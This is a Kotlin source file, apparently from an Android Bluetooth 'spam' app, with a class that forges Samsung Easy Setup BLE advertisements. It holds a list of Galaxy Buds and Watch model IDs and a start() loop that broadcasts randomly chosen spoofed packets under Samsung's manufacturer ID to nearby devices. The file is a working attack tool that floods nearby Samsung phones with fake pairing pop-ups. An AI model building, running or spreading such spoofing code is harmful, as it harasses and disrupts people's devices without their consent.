package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class EasySetupSpam(private val type: EasySetupDevice.type) : Spammer {

    private var _blinkRunnable: Runnable? = null
    private var _isSpamming = false
    private var blinkRunnable: Runnable? = null

    lateinit var devices: Array<EasySetupDevice>
    lateinit var devicesAdvertiseData: Array<AdvertiseData>
    lateinit var scanResponse: AdvertiseData

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    init {
        devices = when (type) {
            EasySetupDevice.type.BUDS -> arrayOf(
                EasySetupDevice("0xEE7A0C", "Fallback Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x9D1700", "Fallback Dots", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x39EA48", "Light Purple Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xA7C62C", "Bluish Silver Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x850116", "Black Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x3D8F41", "Gray & Black Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x3B6D02", "Bluish Chrome Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xAE063C", "Gray Beige Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xB8B905", "Pure White Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xEAAA17", "Pure White Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xD30704", "Black Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x9DB006", "French Flag Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x101F1A", "Dark Purple Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x859608", "Dark Blue Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x8E4503", "Pink Buds", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x2C6740", "White & Black Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x3F6718", "Bronze Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x42C519", "Red Buds Live", EasySetupDevice.type.BUDS),
                EasySetupDevice("0xAE073A", "Black & White Buds2", EasySetupDevice.type.BUDS),
                EasySetupDevice("0x011716", "Sleek Black Buds2", EasySetupDevice.type.BUDS)
            )
            EasySetupDevice.type.WATCH -> arrayOf(
                EasySetupDevice("0x1BEC", "Fallback Watch", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BEB", "Fallback Watch 2", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BEA", "Fallback Watch 3", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE9", "Fallback Watch 4", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE8", "Fallback Watch 5", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE7", "Fallback Watch 6", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE6", "Fallback Watch 7", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE5", "Fallback Watch 8", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE4", "Fallback Watch 9", EasySetupDevice.type.WATCH),
                EasySetupDevice("0x1BE3", "Fallback Watch 10", EasySetupDevice.type.WATCH)
            )
        }

        devicesAdvertiseData = devices.map { device ->
            AdvertiseData.Builder()
                .addManufacturerData(0x0075, Helper.convertHexToByteArray(device.toManufacturerData()))
                .build()
        }.toTypedArray()

        scanResponse = AdvertiseData.Builder()
            .addManufacturerData(0x0075, Helper.convertHexToByteArray("0000000000000000000000000000"))
            .build()
    }

    override fun start() {
        executor.execute @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) {
            _isSpamming = true
            repeat(Helper.MAX_LOOP + 1) { _ ->
                val deviceIndex = (0 until devices.size).random()
                val data = devicesAdvertiseData[deviceIndex]
                BluetoothAdvertiser().advertise(data, scanResponse)
                blinkRunnable?.run()
                Thread.sleep(Helper.getRandomDelay())
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }
}
